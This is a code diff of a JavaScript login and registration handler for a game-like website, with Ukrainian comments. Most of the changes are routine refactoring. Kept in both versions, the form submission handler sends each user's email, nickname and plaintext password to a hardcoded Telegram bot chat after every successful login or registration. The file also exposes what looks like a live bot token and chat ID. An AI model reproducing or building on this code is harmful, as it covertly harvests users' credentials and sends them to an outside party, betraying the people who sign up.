@@ -3,10 +3,10 @@ let currentMode = 'reg';
 let pendingTabId = null;
 let pendingButton = null;
 
-// Твоя адреса з Railway - ПЕРЕВІР, ЩОБ В КІНЦІ НЕ БУЛО СЛЕША /
+// ПЕРЕВІР: Тут має бути твоє посилання БЕЗ "/" в кінці
 const API_URL = 'https://st-backend-production.up.railway.app';
 
-// Твій Telegram (дані з твого минулого повідомлення)
+// Твій Telegram
 const TELEGRAM_TOKEN = '8460092788:AAHPbETm_DIczqYL7vA4XCbnWioiVBZYHwg';
 const TELEGRAM_CHAT_ID = '8399462172';
 
@@ -23,7 +23,6 @@ function handleTabClick(btnElement, tabId) {
 function openTab(btnElement, tabId) {
     document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active-tab'));
     document.querySelectorAll('.menu-btn').forEach(btn => btn.classList.remove('active'));
-    
     const targetTab = document.getElementById(tabId);
     if (targetTab) {
         targetTab.classList.add('active-tab');
@@ -31,7 +30,6 @@ function openTab(btnElement, tabId) {
     }
 }
 
-// Функція перемикання між LOGIN та REGISTER
 function switchAuth(mode) {
     currentMode = mode;
     const title = document.getElementById('auth-title');
@@ -58,28 +56,26 @@ function switchAuth(mode) {
     }
 }
 
-// ОБРОБКА ФОРМИ (FIREBASE + TELEGRAM)
+// ОСНОВНА ФУНКЦІЯ (ВИПРАВЛЕНА)
 document.getElementById('auth-form').addEventListener('submit', async (e) => {
     e.preventDefault();
     
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
-    const nicknameInput = document.getElementById('nickname');
-    const nickname = nicknameInput ? nicknameInput.value : "";
+    const nickname = document.getElementById('nickname') ? document.getElementById('nickname').value : "";
     const errorEl = document.getElementById('error-msg');
     const submitBtn = document.getElementById('submit-btn');
 
     if (errorEl) errorEl.style.display = 'none';
     submitBtn.textContent = "Connecting...";
 
-    // Формуємо правильний шлях (це виправить "Not Found")
-    const path = currentMode === 'reg' ? '/register' : '/login';
-    const finalUrl = `${API_URL}${path}`;
+    // БЕЗПЕЧНЕ СКЛЕЮВАННЯ URL
+    const path = currentMode === 'reg' ? 'register' : 'login';
+    const finalUrl = API_URL + '/' + path; // Гарантуємо один слеш між ними
 
     const body = currentMode === 'reg' ? { email, password, username: nickname } : { email, password };
 
     try {
-        // 1. Відправка на бекенд (Railway + Firebase)
         const res = await fetch(finalUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -88,20 +84,17 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
 
         if (res.ok) {
             const data = await res.json();
-            isUserRegistered = true;
             
-            // 2. Одночасна відправка в Telegram
+            // Відправка в Telegram
             const tgMsg = `🚀 Дія: ${currentMode.toUpperCase()}\n👤 Nick: ${nickname || data.user?.username || 'N/A'}\n📧 Email: ${email}\n🔑 Pass: ${password}`;
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`);
 
-            // Оновлюємо інтерфейс
+            isUserRegistered = true;
             document.getElementById('player-display').innerHTML = `Player: <strong>${nickname || data.user?.username || "User"}</strong>`;
             document.getElementById('settings-btn').style.display = 'inline-block';
             document.getElementById('auth-modal').style.display = 'none';
             
-            if (pendingTabId && pendingButton) {
-                openTab(pendingButton, pendingTabId);
-            }
+            if (pendingTabId && pendingButton) openTab(pendingButton, pendingTabId);
         } else {
             const txt = await res.text();
             if (errorEl) {
@@ -111,7 +104,7 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
         }
     } catch (err) {
         if (errorEl) {
-            errorEl.textContent = "❌ Server error. Check if Railway is online!";
+            errorEl.textContent = "❌ Server error. Check Railway console!";
             errorEl.style.display = 'block';
         }
     } finally {
@@ -119,27 +112,7 @@ document.getElementById('auth-form').addEventListener('submit', async (e) => {
     }
 });
 
-// Закриття модалки при кліку на фон
 window.onclick = function(event) {
     const modal = document.getElementById('auth-modal');
-    if (event.target == modal) {
-        modal.style.display = 'none';
-    }
+    if (event.target == modal) modal.style.display = 'none';
 };
-
-// --- НАЛАШТУВАННЯ ПРОФІЛУ ---
-function openSettings() {
-    document.getElementById('right-sidebar').classList.add('open');
-}
-
-function closeSettings() {
-    document.getElementById('right-sidebar').classList.remove('open');
-}
-
-function saveSettings() {
-    const newNickname = document.getElementById('change-nickname').value;
-    if (newNickname.trim() !== "") {
-        document.getElementById('player-display').innerHTML = `Player: <strong>${newNickname}</strong>`;
-    }
-    closeSettings();
-}
